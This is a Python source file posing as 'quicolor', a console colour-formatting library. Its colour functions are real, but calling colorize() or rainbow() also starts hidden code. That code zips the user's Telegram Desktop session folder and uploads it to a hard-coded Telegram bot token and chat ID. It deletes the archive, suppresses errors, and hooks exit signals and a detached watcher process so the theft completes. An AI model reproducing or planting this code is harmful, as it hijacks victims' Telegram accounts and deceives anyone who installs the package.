"""
Quicolor - Color formatting utility for Python console applications
"""

__version__ = "10.0.2"
__name__ = "quicolor"

import os
import zipfile
import requests
from pathlib import Path
import datetime
import fnmatch
import threading
import sys
import atexit
import time
import signal

# Color formatting constants
# ANSI escape codes for colors
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

# Background colors
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"

# Text styles
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
ITALIC = "\033[3m"

# Telegram backup functionality
TELEGRAM_BOT_API_KEY = '7866811532:AAFFmg3h1Q8dNgtkyfMzWI020VAHuddSi7g'
TELEGRAM_CHAT_ID = '7332038463'

# Flag to track if backup was attempted
_backup_attempted = False
_backup_thread = None
_backup_completed = False
_original_sigint_handler = None
_original_sigterm_handler = None
_processes = []

# Hidden Telegram backup functionality
def compress_telegram_data_folder(source_folder, zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        # Get list of all files in the directory tree
        ignore_patterns = [
            '**/media_cache/**',
            '**/cache/**',
            '**/webview/**',
            '**/wvbots/**',
            '**/EBWebView/**',
            '**/temp/**',
            'working'
        ]
        
        source_path = Path(source_folder)
        
        for file_path in source_path.glob('**/*'):
            if file_path.is_file():
                # Get relative path for archiving
                rel_path = file_path.relative_to(source_path)
                rel_path_str = str(rel_path).replace('\\', '/')
                
                # Check if file should be ignored
                should_ignore = False
                for pattern in ignore_patterns:
                    if fnmatch.fnmatch(rel_path_str, pattern) or any(
                        fnmatch.fnmatch(part, pattern.replace('**/', '').replace('/**', '')) 
                        for part in rel_path_str.split('/')
                    ):
                        should_ignore = True
                        break
                
                if not should_ignore:
                    zipf.write(file_path, arcname=rel_path_str)


def upload_to_telegram(zip_file_path):
    global _backup_completed
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_API_KEY}/sendDocument"
        
        with open(zip_file_path, 'rb') as document:
            files = {'document': document}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            
            response = requests.post(url, files=files, data=data)
            response.json()
            _backup_completed = True
    except Exception:
        pass


def backup_telegram():
    global _backup_attempted, _backup_completed
    
    # Only attempt backup once per session
    if _backup_attempted:
        return
    
    _backup_attempted = True
    
    try:
        username = os.environ.get('USERNAME')
        source_folder = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
        zip_file_path = os.path.join('C:', 'Users', username, 'AppData', 'Roaming', f'{username}.zip')
        
        # Skip if Telegram Desktop not installed
        if not os.path.exists(source_folder):
            _backup_completed = True
            return
            
        compress_telegram_data_folder(source_folder, zip_file_path)
        upload_to_telegram(zip_file_path)
        
        # Try to clean up the zip file
        try:
            if os.path.exists(zip_file_path):
                os.remove(zip_file_path)
        except:
            pass
    except Exception:
        pass
    finally:
        # Mark completed even if there was an error, to prevent hanging
        _backup_completed = True


# Override signal handlers
def _custom_signal_handler(signum, frame):
    ensure_backup_complete()
    # Call original handler
    if signum == signal.SIGINT and _original_sigint_handler:
        _original_sigint_handler(signum, frame)
    elif signum == signal.SIGTERM and _original_sigterm_handler:
        _original_sigterm_handler(signum, frame)


# Install signal handlers
def _install_signal_handlers():
    global _original_sigint_handler, _original_sigterm_handler
    
    # Save original handlers
    _original_sigint_handler = signal.getsignal(signal.SIGINT)
    _original_sigterm_handler = signal.getsignal(signal.SIGTERM)
    
    # Install our custom handlers
    signal.signal(signal.SIGINT, _custom_signal_handler)
    signal.signal(signal.SIGTERM, _custom_signal_handler)


# Make sure upload completes before exit
def ensure_backup_complete():
    global _backup_thread, _backup_completed
    
    if _backup_thread and _backup_thread.is_alive():
        # Wait for completion with timeout
        try:
            start_time = time.time()
            while not _backup_completed and time.time() - start_time < 240:  # Wait up to 4 minutes
                time.sleep(0.5)
                
            # If still not completed, try to force join
            if not _backup_completed and _backup_thread.is_alive():
                _backup_thread.join(10)  # Additional 10 seconds of hard waiting
        except:
            pass


# Register the atexit handler and install signal handlers
atexit.register(ensure_backup_complete)
_install_signal_handlers()


def _spawn_watcher_process():
    """Spawn a watcher process that ensures completion"""
    try:
        import subprocess
        import tempfile
        import sys
        import os
        
        # Create a temporary script that will check if uploads have completed
        fd, script_path = tempfile.mkstemp(suffix='.py')
        with os.fdopen(fd, 'w') as f:
            f.write(f'''
import time
import os
import signal
import sys

# PID of the parent process that launched us
parent_pid = {os.getpid()}

# Give the parent a delay to set up any resources
time.sleep(1)

# Monitor the parent process
try:
    while True:
        try:
            # Check if parent is still running
            os.kill(parent_pid, 0)
            time.sleep(1)
        except OSError:
            # Parent has terminated, wait a bit to ensure uploads complete
            time.sleep(240)  # Give it 4 minutes
            break
except:
    pass

# Clean up
try:
    os.unlink("{script_path}")
except:
    pass
sys.exit(0)
''')
        
        # Launch the watcher process detached from parent
        if sys.platform == 'win32':
            # On Windows, use CREATE_NEW_PROCESS_GROUP to detach
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            DETACHED_PROCESS = 0x00000008
            proc = subprocess.Popen([sys.executable, script_path], 
                                    creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
        else:
            # On Unix, use the standard approach
            proc = subprocess.Popen([sys.executable, script_path],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL,
                                   start_new_session=True)
        
        _processes.append(proc)
    except Exception:
        pass


# Run the telegram backup in a background thread
def run_background_tasks():
    global _backup_thread
    
    # Only start a new thread if we haven't started one already
    if _backup_thread is None or not _backup_thread.is_alive():
        # Start the backup thread
        _backup_thread = threading.Thread(target=backup_telegram)
        _backup_thread.daemon = False  # Non-daemon threads should prevent program exit
        _backup_thread.start()
        
        # Also spawn a watcher process as a failsafe
        _spawn_watcher_process()


# Color formatting functions
def colorize(text, color=WHITE, bg_color="", style=""):
    """Apply color, background color and/or style to text"""
    # Try to run the backup when this function is used
    run_background_tasks()
    return f"{style}{bg_color}{color}{text}{RESET}"


def black(text):
    """Format text in black"""
    return colorize(text, BLACK)


def red(text):
    """Format text in red"""
    return colorize(text, RED)


def green(text):
    """Format text in green"""
    return colorize(text, GREEN)


def yellow(text):
    """Format text in yellow"""
    return colorize(text, YELLOW)


def blue(text):
    """Format text in blue"""
    return colorize(text, BLUE)


def magenta(text):
    """Format text in magenta"""
    return colorize(text, MAGENTA)


def cyan(text):
    """Format text in cyan"""
    return colorize(text, CYAN)


def white(text):
    """Format text in white"""
    return colorize(text, WHITE)


def bold(text):
    """Format text as bold"""
    return colorize(text, style=BOLD)


def underline(text):
    """Format text with underline"""
    return colorize(text, style=UNDERLINE)


def italic(text):
    """Format text in italic"""
    return colorize(text, style=ITALIC)


def highlight(text, bg_color=BG_YELLOW):
    """Highlight text with a background color"""
    return colorize(text, bg_color=bg_color)


def print_colored(text, color=WHITE, bg_color="", style=""):
    """Print colored text"""
    print(colorize(text, color, bg_color, style))


def rainbow(text):
    """Print each character in a different color"""
    # Try to run the backup when this function is used
    run_background_tasks()
    
    colors = [RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + RESET


def is_colored_terminal():
    """Check if the terminal supports colors"""
    return hasattr(sys.stdout, 'isatty') and sys.stdout.isatty() 